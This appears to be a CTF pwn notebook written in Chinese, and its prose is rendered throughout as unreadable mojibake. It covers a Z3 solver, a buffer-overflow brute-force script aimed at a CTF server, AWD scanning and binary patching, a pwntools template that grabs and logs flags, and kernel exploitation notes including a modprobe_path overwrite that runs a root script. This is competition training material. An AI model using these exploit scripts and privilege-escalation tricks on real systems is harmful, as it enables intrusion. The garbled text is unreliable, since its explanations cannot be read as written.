è¿™ä¸ªè„šæœ¬é¦–å…ˆä¼šç”¨ `docker network ls -q` æ¥è·å–æ‰€æœ‰ç½‘ç»œçš„ IDï¼Œç„¶åç”¨ `xargs` å°†è¿™äº› ID ä½œä¸ºå‚æ•°ä¼ é€’ç»™ `docker network rm`ï¼Œä»è€Œåˆ é™¤æ‰€æœ‰çš„ç½‘ç»œã€‚

è¯·æ³¨æ„ï¼Œè¿è¡Œè¿™ä¸ªè„šæœ¬éœ€è¦ Docker çš„ç›¸å…³æƒé™ã€‚å¦‚æœä½ åœ¨è¿è¡Œè¿™ä¸ªè„šæœ¬æ—¶é‡åˆ°äº†æƒé™é—®é¢˜ï¼Œä½ å¯èƒ½éœ€è¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œè¿™ä¸ªè„šæœ¬ã€‚æ­¤å¤–ï¼Œå¦‚æœä¸€ä¸ªç½‘ç»œæ­£åœ¨è¢«ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨ä½¿ç”¨ï¼Œä½ éœ€è¦å…ˆåœæ­¢å’Œåˆ é™¤è¿™äº›å®¹å™¨ï¼Œæ‰èƒ½åˆ é™¤è¯¥ç½‘ç»œã€‚

### Z3è§£é‡Šå™¨

```python
# _*_ coding:utf-8 _*_
from z3 import *

# ç”ŸæˆV3-V18å˜é‡
for i in range(3,19):
  locals()['v'+ str(i)]= Int('v%s'%i)

# x = Real('x') # æœ‰ç†æ•°

s = Solver()
s.add(v5 * v4 * v3 - v6 == 36182)
s.add(v3 == 19)
s.add(v5 * 19 * v4 + v6 == 36322)
s.add((v13 + v3 - v8) * v16 == 32835)
s.add((v4 * v3 - v5) * v6 == 44170)
s.add((v5 + v4 * v3) * v6 == 51590)
s.add(v9 * v8 * v7 - v10 == 61549)
s.add(v10 * v15 + v4 + v18 == 19037)
s.add(v9 * v8 * v7 + v10 == 61871)
s.add((v8 * v7 - v9) * v10 == 581693)
s.add(v11 == 50)
s.add((v9 + v8 * v7) * v10 == 587167)
s.add(v13 * v12 * v11 - v14 == 1388499)
s.add(v13 * v12 * v11 + v14 == 1388701)
s.add((v12 * v11 - v13) * v14 == 640138)
s.add((v11 * v5 - v16) * v12 == 321081)
s.add((v13 + v12 * v11) * v14 == 682962)
s.add(v17 * v16 * v15 - v18 == 563565)
s.add(v17 * v16 * v15 + v18 == 563571)
s.add(v14 == 101)
s.add((v16 * v15 - v17) * v18 == 70374)
s.add((v17 + v16 * v15) * v18 == 70518)


if s.check() == sat:
  result = s.model()
  print result

```



### çˆ†ç ´è„šæœ¬

å¦‚æœæ˜¯è¦†ç›–è¿”å›åœ°å€å¾—çˆ†ç ´

```python
count=1

while true :
        p=remote("nc.eonew.cn",10002)
        p.send('A'*0x80+'A'*8+'\xa6\x15\x04') #æ³¨æ„ä¸èƒ½ç”¨sendlineå¦åˆ™ä¼šè¯»å–'\n'
        p.recv()
        print(count)
        count += 1
        try:    
               p.recv(timeout=0.2)# [*] Got EOF while reading in interactive è½¬åŒ–ä¸º Traceback
               p.recv(timeout=0.2)
        except:
               p.close()
               continue
        break
ia()
```





## çº¿ä¸‹æ¯”èµ›ğŸ›œ

### AWD

æ‰«å­˜æ´»

```shell
nmap -sn 192.168.3.1/24
nmap -sT --min-rate 10000 -p- 192.168.3.122
```

tcpdumpæŠ“å–æµé‡åŒ…

```shell
tcpdump -i lo host 192.168.1.123 and port 9999 -w /tmp/xxx.pcap
```

ç„¶åwiresharkåˆ†æï¼Œé€‰æ‹©åŒ…->åŸå§‹æ•°æ®

```python
payload = '''
'''
payload = payload.split("\n")
print(payload)
for x in payload:
	p.send(unhex(x))
```


### AWDP
#### FIX
printfæ—æ ¼å¼åŒ–å­—ç¬¦ä¸²
+ æ”¹ä¸ºputs
+ æœ‰å¯èƒ½å­˜åœ¨å¯¹printfå‡½æ•°çš„check
ä¿®æ”¹å¯„å­˜å™¨èµ‹å€¼ï¼Œä¸æ”¹åŠ¨printfä»¥åŠeh_frame
rdi<- %s
rsi <- åœ°å€
åŠ %så‚æ•°ã€‚åœ¨`.eh_frame`æ®µä¸­å¡«å…¥%så­—ç¬¦ä¸²ï¼Œå‡è®¾åœ°å€ä¸º0x400c01ï¼Œå°†`mov edi, offset format`ï¼Œä¿®æ”¹ä¸º`mov edi offset 0x400c01, mov rsi offset format`ã€‚


UAFæ¼æ´
+ å¢åŠ ç½®ç©ºçš„éƒ¨åˆ†
	å¦‚æœç©ºé—´ä¸å¤Ÿçš„æƒ…å†µï¼Œå¯ä»¥è€ƒè™‘æ”¹eh_frame
	åœ¨eh_frameæ®µå†™è¿™äº›å†…å®¹ï¼ŒåŸfreeå‡½æ•°jumpè¿‡æ¥å³å¯
	
```c
call    _free
mov     qword ptr [202050h], 0
jmp     loc_C0A
```

æ”¹eh_frameï¼š
åœ¨.eh_frameæ·»åŠ å‡½æ•°åŠŸèƒ½ï¼Œé€‰ä¸­eh_frameæ®µï¼Œå…¨éƒ¨nopï¼Œç„¶åedit->function->create function
å¢åŠ eh_frameæ®µæ‰§è¡Œæƒé™ï¼Œä¿®æ”¹å¼€å¤´eh_frameçš„phtï¼ŒFlagså­—æ®µ

![image-20231017194109359](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231017194109359.png)
+ nopæ‰freeå‡½æ•°

é™åˆ¶å¤§å°ç±»
+ æ¯”å¦‚strncpyï¼Œmemcpyç±»çš„å‡½æ•°ï¼Œç”±å¯å˜sizeæ”¹ä¸ºå›ºå®šsizeï¼Œï¼ˆSafeParseã€mvvmï¼‰


mmapæƒé™
+  7 æ”¹ä¸º 3ï¼ˆoldvmã€cgiï¼‰

å¾ªç¯while
+ åªéœ€è¦æŠŠå˜é‡å˜ä¸ºå¸¸é‡0/1


æ•°ç»„è¶Šç•Œ
+ æ·»åŠ åˆ¤æ–­è¯­å¥
æ¯”å¦‚ï¼Œåœ¨eh_frameæ®µå†™è¿™äº›å†…å®¹ï¼Œjmpè¿‡æ¥

```
.eh_frame:00000000004012C8 83 BD E8 FB FF FF 63          cmp     dword ptr [rbp-418h], 63h ; 'c'
.eh_frame:00000000004012CF 0F 87 25 F9 FF FF             ja      loc_400BFA
.eh_frame:00000000004012CF
.eh_frame:00000000004012D5 83 BD EC FB FF FF 15          cmp     dword ptr [rbp-414h], 15h
.eh_frame:00000000004012DC 0F 87 18 F9 FF FF             ja      loc_400BFA
.eh_frame:00000000004012DC
.eh_frame:00000000004012E2 48 8D 3D 2F FA FF FF          lea     rdi, aPleaseInputWas            ; "PLEASE INPUT wasd TO MOVE YOURSELF!"
.eh_frame:00000000004012E9 E9 0C F6 FF FF                jmp     loc_4008FA
```

æœ¬æ¥æœ‰å¼€æ²™ç®±
+ prctl->nopï¼Œå†è¿›è¡ŒåŠ æ²™ç®±çš„æ“ä½œ

åé—¨å‘½ä»¤æ‰§è¡Œæ¼æ´
+ ç ´åå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚flagè¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œæˆ–è€…binsh

fixç‰¹æ®ŠæŠ€å·§
+ å°†ç±»freeå‡½æ•°å…¨éƒ¨nopæ‰ï¼Œå¦‚:c++ä¸­çš„delete


#### é€šé˜²

pwn_waf

https://github.com/i0gan/pwn_waf

```bash
mkdir /tmp/.waf         # åˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œæ³¨æ„è¦å’Œç¼–è¯‘æ—¶çš„é…ç½®æ–‡ä»¶ä¸€è‡´ã€‚
chmod 777 /tmp/.waf     # ä¿®æ”¹å¯¹åº”çš„æƒé™
cp /tmp/hosts.txt /tmp/.waf/hosts.txt  # å°†å¤šç›®æ ‡é˜²æŠ¤çš„å¯¹è±¡æ–‡ä»¶æ”¾åˆ°æ­£ç¡®ä½ç½®

cp /path/pwn /tmp/.waf       # å°†è¦é˜²æŠ¤çš„pwnæ–‡ä»¶ï¼Œå¤åˆ¶åˆ°å¯¹åº”çš„ç›®å½•
cp /tmp/catch /path/pwn      # ç”¨catch æˆ–è€… i0gan ã€ forward æ›¿æ¢åŸå§‹çš„pwnæ–‡ä»¶
chmod 777 /path/pwn
chmod 777 /tmp/.waf/pwn
```

ToPaWaf

https://github.com/ErodedElk/ToPaWaf

sandbox
https://github.com/TTY-flag/evilPatcher

```bash
evilPatcher file [enter]
evilPatcher file /pach/sandboxfile
```


#### attack
å¸¸è§„pwné¢˜æ€è·¯äº†ï¼Œå¸¸è§çš„ä½“å‹å¦‚æ ˆå †æº¢å‡º(scanfå‡½æ•°)ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ŒUAF

#### upload
ä¸€èˆ¬éƒ½æ˜¯è®©ä½ å°†æä¾›çš„updata.shå’Œä¿®è¡¥åçš„pwnæ–‡ä»¶æ‰“ä¸€ä¸ªtaråŒ…ï¼Œç„¶åä¸Šä¼ åˆ°å¹³å°

æ‰“åŒ…å‘½ä»¤

```shell
tar zcvf update.tar.gz update.sh pwn_fix
```

update.sh

```shell
#!/bin/sh
mv pwn_fix /home/ctf/pwn
# cp libc.so.6 /lib/x86_64-linux-gnu/libc.so.6
# cp ld-xx.so/lib64/ld-linux-x86-64.so.2
chmod 777 /home/ctf/pwn
```

idaå†…è¿›è¡Œç¨‹åºä¿®è¡¥å¾—åˆ°pwn_fix
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20250624102222.png)
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20250624102231.png)

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20250624102320.png)







### å‚è€ƒèµ„æ–™

https://ohmygodlin.github.io/ctf/awd/2020/11/20/AWD-pwn%E5%A4%87%E5%BF%98/



```
llvmæ··æ·†0x23aaa 0x28
```





### æäº¤æ¨¡æ¿

```python
# _*_ coding:utf-8 _*_
from pwn import *
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# context.log_level = "debug"
context.arch = "amd64"

context.terminal = ['tmux', 'splitw', '-h']

ip = server_ip = sys.argv[1].split(':')[0]
port = server_port = int(sys.argv[1].split(':')[1])

p = remote(ip, port)
# p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def cat_flag():
    flag_header = 'flag{'
    sleep(1)
    sl('cat flag')
    ru(flag_header)
    flag = flag_header + ru('}') + '}'
    write_to_flags(flag + '\n')
    write_to_logs('\nexploited: ' + server_ip.encode() + ':' + str(server_port).encode() + flag)
    exit(0)

def write_to_flags(d):
    fd = open('./flags', 'ab')
    fd.write(d + '\n')
    fd.close()
    
ia()
cat_flag()
```



## Linux KernelğŸ¥œ

### è°ƒè¯•æ³¨æ„

```
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

dbgè¾“å‡ºï¼ˆç”¨äºå †å–·æ£€æµ‹å’Œæ•°æ®æ£€æŸ¥ï¼‰

```c
#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

void hexdump(void *mem, unsigned int len) {
    putchar('\n');
    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {
        /* print offset */
        if(i % HEXDUMP_COLS == 0) {
            printf("0x%06x: ", i);
        }

        /* print hex data */
        if(i < len) {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        /* end of block, just aligning for ASCII dump */
        else {        
            printf("   ");
        }

        /* print ASCII dump */
        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {
            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {
                 /* end of block, not really printing */
                if(j >= len) {
                    putchar(' ');
                }
                /* printable char */
                else if(isprint(((char*)mem)[j])) {
                    putchar(0xFF & ((char*)mem)[j]);
                }
                 /* other char */
                else {
                    putchar('.');
                }
            }
            putchar('\n');
        }
    }
    putchar('\n');
}
```

dbgè¾“å‡ºæ¨¡æ¿

```c
printf("\033[32m\033[1m[+] Getting the root......\033[0m\n");
```

è°ƒè¯•å†…æ ¸æ¨¡å—bssæ®µæ—¶ï¼Œè¦æ³¨æ„å®é™…åœ°å€è·ŸIDAåˆ†æå‡ºæ¥çš„åœ°å€ä¸ä¸€æ ·ã€‚

è§£æ‰“åŒ…cpioå‘½ä»¤

```shell
# å¿«é€Ÿæ‰“åŒ…æµ‹è¯•EXP
ktest ./rootfs.cpio ./exp
ktest -q ./rootfs.cpio ./exp # ç›´æ¥æ‰“åŒ…

# è§£åŒ…
#!/bin/bash

# ç¡®ä¿æä¾›äº†æ–‡ä»¶åä½œä¸ºå‚æ•°
if [ "$#" -ne 1 ]; then
        echo "Usage: $0 <rootfs.cpio>"
        exit 1
fi

BASENAME=$(basename "$1")
BASENAME="${BASENAME%%.*}"

mv $1 $1.gz
unar $1.gz
mv $1 $BASENAME
mv $1.gz $1
echo "[+]Successful"

excpio ./rootfs.cpio

# æ‰“åŒ…
#!/bin/sh

# æ£€æŸ¥å‚æ•°ä¸ªæ•°
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 ."
    exit 1
fi

# è·å–å½“å‰ç›®å½•çš„åç§°
CURRENT_DIR=$(basename "$(pwd)")

# åœ¨ä¸Šçº§ç›®å½•åˆ›å»ºä¸€ä¸ªä»¥å½“å‰ç›®å½•åå‘½åçš„ .cpio æ–‡ä»¶
find . | cpio -o --format=newc > "../${CURRENT_DIR}.cpio"



cd rootfs
packcpio .
```

å †ä¿¡æ¯
```
gefâ¤  p &kmalloc_caches
$1 = (struct kmem_cache *(*)[14]) 0xffffffff81e21700 <kmalloc_caches>
gefâ¤  x/20gx 0xFFFFFFFF81E21700
<kmalloc_caches>:	0x0000000000000000	0xffff880002c01a00(0x60)
<kmalloc_caches+16>:	0xffff880002c01800(0xc0)	0xffff880002c01e00(0x8)
<kmalloc_caches+32>:	0xffff880002c01d00(0x10)	0xffff880002c01c00(0x20)
<kmalloc_caches+48>:	0xffff880002c01b00(0x40)	0xffff880002c01900(0x80)
<kmalloc_caches+64>:	0xffff880002c01700(0x100)	0xffff880002c01600(0x200)
<kmalloc_caches+80>:	0xffff880002c01500(0x400)	0xffff880002c01400(0x800)
<kmalloc_caches+96>:	0xffff880002c01300(0x1000)	0xffff880002c01200(0x2000)
0xffffffff81e21770 <kmem_cache>:	0xffff880002c01000	0x0000000000000004
0xffffffff81e21780 <sysctl_compact_memory>:	0x0000000000000000	0xffff8800026e6000
0xffffffff81e21790 <high_memory>:	0xffff880003fe0000	0x0000000000000000


gefâ¤  p (struct kmem_cache)*0xffff880002c01500

```

 slab_freelist_hardened

```shell
vmlinux-to-elf bzImage vmlinux.elf
åœ¨vmlinux.elfæœç´¢kmallocå‡½æ•°ï¼Œçœ‹prefetcht0æŒ‡ä»¤ä¸´è¿‘çš„å‰å‡ æ¡æŒ‡ä»¤æ²¡æœ‰xoræŒ‡ä»¤ï¼Œæ²¡æœ‰åˆ™æ²¡æœ‰å¼€å¯
```

### å†…æ ¸çŸ¥è¯†ç‚¹
| åŒºåŸŸ                                    | èµ·å§‹åœ°å€                  | æœ€å¤§åç§»            |
| ------------------------------------- | --------------------- | --------------- |
| direct mapping of all physical memory | 0xffff 8880 0000 0000 | 0xfff f000 0000 |
| kernel text mapping                   | 0xffff ffff 8000 0000 | 0xfff0 0000     |
|                                       |                       |                 |
æ¢æµ‹å†…æ ¸åŸºå€ï¼šä»linuxåˆ†é…çš„0xffffffff80000000è¿™ä¸ªåœ°å€å¼€å§‹ï¼Œä»¥0x100000ä¸ºé—´éš”ï¼Œè¿›è¡Œæ¢æµ‹ï¼Œç¬¬ä¸€ä¸ªå¯è®¿é—®çš„ç‚¹ï¼Œå°±æ˜¯å†…æ ¸åŠ è½½åŸºå€ã€‚
kernelbase = 0xffffffff81000000

å…³äºå†…æ ¸å¼€å‘
```c
#include <linux/module.h>
//å†…æ ¸æ¨¡å—åŸºç¡€æ”¯æŒï¼Œä¾‹å¦‚ MODULE_LICENSEã€module_initã€module_exit
#include <linux/kernel.h>
//æä¾›åŸºæœ¬çš„å†…æ ¸å‡½æ•°ï¼Œä¾‹å¦‚ printk
#include <linux/cdev.h>
#include <linux/fs.h>
//æ–‡ä»¶ç³»ç»Ÿç›¸å…³ç»“æ„ï¼Œä¾‹å¦‚ struct file_operations
#include <linux/uaccess.h>
//ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„æ•°æ®è®¿é—®è¾…åŠ©å‡½æ•°
#include <linux/slab.h>
#include <linux/random.h>
#include <asm/uaccess.h>
```

### å†…æ ¸å †ç®¡ç†

#### èŠ‚ç‚¹ åŒº é¡µçš„æ¦‚å¿µ

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105150511.png)

MCå°±æ˜¯ä¸€ä¸ªèŠ‚ç‚¹çš„è¾¹æ ‡å¿—ï¼Œå¯¹åº”äº†CPUç»„å’Œä¸€æ®µå†…å­˜ï¼Œæ¯ä¸ªèŠ‚ç‚¹é—´ç‹¬ç«‹å·¥ä½œ
åœ¨è¿™æ®µå†…å­˜ä¸Šä¼šè¿›ä¸€æ­¥åˆ’åˆ†ä¸ºä¸åŒçš„åŒºå¦‚ ZONE_DMAã€ZONE_NORMAL ç­‰
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105150642.png)
è€Œæ¯ä¸ªåŒºå‘¢å°±åƒä¸‹å›¾æ‰€ç¤ºï¼Œæ¯ä¸ªåŒºéƒ½æœ‰è‡ªå·±çš„ä¼™ä¼´ç³»ç»Ÿ
#### buddy system
ä¼™ä¼´å—ï¼Œå¤§å°ç›¸ç­‰ï¼Œåœ°å€ç›¸é‚»ï¼Œéƒ½ç©ºé—²æ—¶ä¼šåˆå¹¶æˆæ›´å¤§å—

å…¶å­˜åœ¨äº åŒº è¿™ä¸€çº§åˆ«ï¼Œç®¡ç†åŒº

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105113714.png)

æŒ‰ç…§ç©ºé—²é¡µé¢çš„è¿ç»­å¤§å°è¿›è¡Œåˆ†é˜¶ç®¡ç†ï¼Œè¿™é‡Œçš„ order çš„å®é™…å«ä¹‰ä¸ºè¿ç»­çš„ç©ºé—²é¡µé¢çš„å¤§å°ï¼Œä¸è¿‡å•ä½ä¸æ˜¯é¡µé¢æ•°ï¼Œè€Œæ˜¯é˜¶ï¼Œå³å¯¹äºæ¯ä¸ªä¸‹æ ‡è€Œè¨€ï¼Œå…¶ä¸­æ‰€å­˜å‚¨çš„é¡µé¢å¤§å°ä¸ºï¼š2^order

åˆ†é…ï¼š
è¯·æ±‚å†…å­˜å‘2çš„æ¬¡æ–¹è¿›è¡Œå¯¹é½ï¼Œç„¶åé€‰æ‹©å¯¹åº”çš„free_areaã€‚å–ä¸åˆ°å°±ä»ä¸‹ä¸€ä¸ª order ä¸­å–å‡ºå†…å­˜é¡µï¼Œä¸€åˆ†ä¸ºäºŒï¼Œè£…è½½åˆ°å½“å‰ä¸‹æ ‡å¯¹åº”é“¾è¡¨ä¸­ã€‚
é‡Šæ”¾ï¼š
é‡Šæ”¾åˆ°å¯¹åº”çš„free_arenaä¸­ï¼Œæ£€æŸ¥ä¼™ä¼´å—çŠ¶æ€å¦‚æœä¹Ÿæ˜¯freeçš„ï¼Œé‚£å°±åˆå¹¶è¿›å…¥ä¸‹ä¸€ä¸ªorder

#### slab allocator
ä¸‰ä¸ªç‰ˆæœ¬
slab -> slob -> slub

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105115134.png)
kmem_cache ä¸ºä¸€ä¸ªå…¨å±€çš„åŸºæœ¬çš„ allocator ç»„ä»¶ï¼Œç”¨äºåˆ†é…Objï¼Œæ¯ä¸ª kmem_cache ä»£è¡¨ä¸€ç§ç‰¹å®šå¤§å°å’Œç±»å‹çš„å†…å­˜ç¼“å­˜ï¼Œç”¨äºç®¡ç†ç‰¹å®šç±»å‹çš„å¯¹è±¡åˆ†é…ã€‚
æ¯ä¸ªç”¨äºæ ‡è®°ä¸åŒå¤§å°çš„kmem_cacheå­˜åœ¨äºä¸¤ä¸ªç»“æ„ä½“kmalloc_cashes(é€šè¿‡CPU)å’Œkmalloc_dma_caches(ä¸é€šè¿‡CPU)ä¸­ï¼Œè¿™é‡Œä¸»è¦çœ‹kmalloc_cashes


kmem_cacheä¸»è¦ç”±2ä¸ªå¤§æ¨¡å—ï¼Œkmem_cache_cpuå’Œkmem_cache_nodeç»„æˆ
kmem_cache_cpu(æŒ‰æ ¸å¿ƒ)æ˜¯ä¸€ä¸ª percpu å˜é‡(æ¯ä¸ªæ ¸å¿ƒä¸Šæœ‰ä¸€ä¸ª)ï¼ŒPer-CPU å˜é‡æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ•°æ®ç»“æ„ï¼Œå®ƒä¸ºç³»ç»Ÿä¸­çš„æ¯ä¸ª CPU æ ¸å¿ƒæä¾›äº†ä¸€ä¸ªç‹¬ç«‹çš„å˜é‡å‰¯æœ¬ï¼Œå³é’ˆå¯¹äºå½“å‰CPUæ ¸å¿ƒ
ä¸»è¦ç”¨ä»¥è¡¨ç¤ºå½“å‰æ ¸å¿ƒæ­£åœ¨ä½¿ç”¨çš„ slubï¼Œå½“å‰ CPU ä¼šä¼˜å…ˆä» kmem_cache_cpu ä¸Šå– object

kmem_cache_node(æŒ‰èŠ‚ç‚¹)ï¼Œæ¯ä¸ª NUMA èŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ kmem_cache_node å®ä¾‹ï¼Œåˆ†åˆ«ç®¡ç†å„è‡ªèŠ‚ç‚¹çš„å†…å­˜åˆ†é…æƒ…å†µ
å…¶ä¸­ä¸»è¦æœ‰2ä¸ªé“¾è¡¨ï¼Œåˆ†åˆ«æ˜¯partialå’Œfull
partialï¼šslubé“¾è¡¨ï¼Œslub ä¸Šå­˜åœ¨ç€ä¸€å®šæ•°é‡çš„ç©ºé—² objectï¼Œä½†å¹¶éå…¨éƒ¨ç©ºé—²ã€‚
fullï¼šslubé“¾è¡¨ï¼Œè¯¥ slub ä¸Šçš„æ‰€æœ‰ object éƒ½è¢«åˆ†é…å‡ºå»äº†ã€‚

åˆ†é…
é¦–å…ˆä» kmem_cache_cpu ä¸Šå–å¯¹è±¡ï¼Œè‹¥æœ‰åˆ™ç›´æ¥è¿”å›ã€‚
è‹¥ kmem_cache_cpu ä¸Šçš„ slub å·²ç»æ— ç©ºé—²å¯¹è±¡äº†ï¼Œå¯¹åº” slub ä¼šè¢«ä» kmem_cache_cpu ä¸Šå–ä¸‹ï¼Œå¹¶å°è¯•ä» partial é“¾è¡¨ä¸Šå–ä¸€ä¸ª slub æŒ‚è½½åˆ° kmem_cache_cpu ä¸Šï¼Œç„¶åå†å–å‡ºç©ºé—²å¯¹è±¡è¿”å›ã€‚
è‹¥ kmem_cache_node çš„ partial é“¾è¡¨ä¹Ÿç©ºäº†ï¼Œé‚£å°±å‘ buddy system è¯·æ±‚åˆ†é…æ–°çš„å†…å­˜é¡µï¼Œåˆ’åˆ†ä¸ºå¤šä¸ª object ä¹‹åå†ç»™åˆ° kmem_cache_cpuï¼Œå–ç©ºé—²å¯¹è±¡è¿”å›ä¸Šå±‚è°ƒç”¨
(\*è°ƒç”¨å†…å­˜åˆ†é…å‡½æ•°æ—¶æä¾›çš„æ ‡å¿—ï¼ˆå¦‚ GFP_KERNEL, GFP_ATOMIC ç­‰ï¼‰ä¼šå†³å®šä»å“ªä¸ªbuddy systemé‡Œå–å†…å­˜é¡µ)
é‡Šæ”¾ï¼š
è‹¥è¢«é‡Šæ”¾ object å±äº kmem_cache_cpu çš„ slubï¼Œç›´æ¥ä½¿ç”¨å¤´æ’æ³•æ’å…¥å½“å‰ CPU slub çš„ freelistã€‚
è‹¥è¢«é‡Šæ”¾ object å±äº kmem_cache_node çš„ partial é“¾è¡¨ä¸Šçš„ slubï¼Œç›´æ¥ä½¿ç”¨å¤´æ’æ³•æ’å…¥å¯¹åº” slub çš„ freelistã€‚
è‹¥è¢«é‡Šæ”¾ object ä¸º full slubï¼Œåˆ™å…¶ä¼šæˆä¸ºå¯¹åº” slub çš„ freelist å¤´èŠ‚ç‚¹ï¼Œä¸”è¯¥ slub ä¼šè¢«æ”¾ç½®åˆ° partial é“¾è¡¨ã€‚

### å†…æ ¸é¢˜ç›®ä¸Šæ‰‹
#### RWCTF 2023 digging into kernel 3
åœ¨å®é™…é¢˜ç›®ä¸­å¦‚æœèƒ½å®ç°ä»»æ„åœ°å€å†™ï¼Œå°±å¯ä»¥ä¿®æ”¹modprobe_pathä¸º/tmp/xï¼Œä»è€Œå®ç°shellcodeæ‰§è¡Œ
åŸç†æ˜¯å½“linuxç³»ç»Ÿåœ¨è¿è¡Œä¸€ä¸ªæ— æ³•è¯†åˆ«æ ¼å¼çš„æ–‡ä»¶ï¼Œæ¯”å¦‚

```shell
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
```

è¿è¡Œdummyæ—¶å°±ä¼šä»¥rootæƒé™è°ƒç”¨/sbin/modprobe(å…¶åå­—è®°å½•åœ¨å†…æ ¸å…¨å±€å˜é‡p &modprobe_path)ï¼Œå¦‚æœæˆ‘ä»¬æŒ‰ç…§ä¿®æ”¹æ€è·¯ï¼Œå°±èƒ½æ‰§è¡Œä»»æ„çš„shellæŒ‡ä»¤

```shell
system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/x");
system("chmod +x /tmp/x");
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
system("chmod +x /tmp/dummy");

# åˆ©ç”¨æ¼æ´å°†modprobe_pathæ”¹ä¸º/tmp/xï¼Œæœ€åï¼Œæ‰§è¡Œ/tmp/dummyï¼Œå†…æ ¸å°†è°ƒèµ·/tmp/xï¼ŒæŠŠflagçš„æƒé™è®¾ç½®ä¸º777
```

ç”±äºkptiå†…æ ¸é¡µè¡¨éš”ç¦»ï¼Œä¸èƒ½retåˆ°ç”¨æˆ·ç©ºé—´æ‰§è¡Œropï¼Œæ‰€ä»¥è¦åœ¨å†…æ ¸æ ˆä¸Šå­˜æ”¾ROPé“¾
åœ¨æ‰§è¡Œsyscallè°ƒç”¨çš„æ—¶å€™ï¼Œä¼šæŠŠæ‰€æœ‰å¯„å­˜å™¨çš„å€¼å‹åˆ°å†…æ ¸æ ˆä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ‰§è¡Œsyscallå‰ï¼ŒæŠŠROPé“¾çš„å„ä¸ªéƒ¨åˆ†å­˜å…¥å„ä¸ªå¯„å­˜å™¨ä¸­ï¼ŒæŒ‰ç…§ä¸€å®šé¡ºåºå°±èƒ½åœ¨æ ˆä¸Šå½¢æˆå®Œæ•´çš„ROPé“¾(r15åº”è¯¥åœ¨æ ˆé¡¶)
â€œ5432px1098â€


![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20250610190155.png)

å°±åªéœ€è¦åˆ©ç”¨ä»»æ„åœ°å€å†™ï¼ŒåŠ«æŒä¸ºadd_rsp_x_retçš„gadgetï¼Œå°±å¯ä»¥è·³åˆ°æ ˆåº•è¿™å—ROPé“¾

ä½†æ˜¯ç°åœ¨ç”±äºå¼€å¯äº†kalsrï¼Œæ‰€ä»¥éœ€è¦æ³„éœ²åœ°å€







### ç»“æ„ä½“æ€»ç»“
å†™åœ¨å‰é¢ï¼Œexpçš„é™æ€ç¼–è¯‘ï¼Œç¼–è¯‘å¥½æ”¾è¿›cpioé‡æ–°æ‰“åŒ…å³å¯
```shell
gcc exp.c -static -masm=intel  -o exp 
```

å…³äºbabydriverçš„æ¼æ´ç‚¹ï¼š
ä½¿ç”¨open()æ‰“å¼€è®¾å¤‡æ–‡ä»¶æ—¶è¯¥é©±åŠ¨ä¼šåˆ†é…ä¸€ä¸ªchunkï¼Œè¯¥chunkçš„æŒ‡é’ˆå‚¨å­˜äºå…¨å±€å˜é‡babydev_structä¸­ï¼Œioctlå¯ä»¥é‡æ–°ç”³è¯·è¿™å—å†…å®¹ï¼Œå¹¶è‡ªå®šä¹‰å…¶lenå­—æ®µ

```c
int babyopen(struct inode *inode, struct file *filp)
{
	babydev_struct.device_buf = kmalloc(64,0x24000C0);
	babydev_struct.device_buf_len = 64;
	printk("device open\n");
	return 0;
}
long babyioctl(struct file *fd, unsigned int cmd, unsigned long arg)
{
	size_t v4;	

	v4 = arg;
	if ( cmd == 65537 )
	{
	  kfree(babydev_struct.device_buf);
	  babydev_struct.device_buf = kmalloc(v4,0x24000C0);
	  babydev_struct.device_buf_len = v4;
	  printk("alloc done\n");
	  return 0LL;
	}
	else
	{
	  printk("defalut:arg is %ld",arg);
	  return -22;
	}
}
```

